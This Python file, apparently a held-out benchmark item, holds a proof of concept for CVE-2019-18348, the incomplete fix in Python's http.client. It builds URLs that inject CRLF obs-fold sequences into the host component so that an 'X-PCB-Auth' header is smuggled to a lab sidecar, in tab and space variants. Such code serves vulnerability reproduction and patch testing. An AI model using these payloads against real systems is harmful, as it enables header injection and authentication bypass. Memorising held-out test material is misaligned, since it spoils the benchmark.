#!/usr/bin/env python3
"""[HELD-OUT] CVE-2019-18348 residual -- the incomplete fix in CVE-2019-9947.

CVE-2019-9947 added `_validate_path`, which runs `_contains_disallowed_url_pchar_re`
(`re.compile('[\\x00-\\x20\\x7f]')`) over the URL *path* in http.client.putrequest and
rejects any control character -- closing the PATH injection (see original_poc.py).
But the SAME control-character check was NOT applied to the URL *host* component:
`self.host` (parsed from the URL netloc) was only ASCII/IDNA-encoded, never scanned
for control characters. So CRLF in the host still flows into the outgoing request.

The auto-generated `Host:` header value is still checked by http.client's
`_is_illegal_header_value` (in putheader), which rejects `\\r\\n<non-space>` but ALLOWS
obs-fold continuations (`\\r\\n\\t` / `\\r\\n `). So the residual smuggles the header as
a folded continuation of the Host value:

    Host: 10.89.0.2\\r\\n\\tX-PCB-Auth: <secret>\\r\\n\\t:80

A raw server that unfolds/strips continuation whitespace (the sidecar) observes the
injected `X-PCB-Auth` header. The trailing `\\t:80` gives _get_hostport a numeric port
so it doesn't raise "nonnumeric port"; the host portion left for the socket connect is
`10.89.0.2\\r\\n\\tX-PCB-Auth: <secret>\\r\\n\\t`, which the pre-CVE-2016-10739 glibc
(Debian stretch) leniently resolves to 10.89.0.2 -- exactly the environment condition
the advisory names.

  V1 python 3.7.4: NO _validate_host -> host CRLF/obs-fold accepted -> X-PCB-Auth
                   reaches the sidecar -> ${PCB_FLAG} (residual reaches, bypass!).
  V2 python 3.7.8: _validate_host runs `_contains_disallowed_url_pchar_re` over the
                   host in __init__ (# Prevent CVE-2019-18348) -> InvalidURL -> BLOCKED.

Two obs-fold variants (tab / space continuation) are provided; both bypass V1.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from original_poc import SIDECAR_IP, SIDECAR_PORT, AUTH_SECRET  # noqa: E402


def build_url(cont: str, ip: str = SIDECAR_IP, port: int = SIDECAR_PORT, secret: str = AUTH_SECRET) -> str:
    # CRLF/obs-fold injection in the HOST component. `cont` is the obs-fold
    # continuation whitespace (tab or space) that makes the value pass
    # _is_illegal_header_value while _validate_host (absent on V1) is what would
    # otherwise reject it.
    return "http://{ip}\r\n{c}X-PCB-Auth: {s}\r\n{c}:{port}/".format(
        ip=ip, c=cont, s=secret, port=port
    )


VECTORS = [
    ("cve-2019-18348-host-obsfold-tab", "\t"),
    ("cve-2019-18348-host-obsfold-space", " "),
]


def candidate(vec=None) -> dict:
    vid, cont = vec if vec is not None else VECTORS[0]
    return {"id": vid, "url": build_url(cont), "component": "host"}


if __name__ == "__main__":
    for v in VECTORS:
        c = candidate(v)
        print(c["id"], repr(c["url"]))
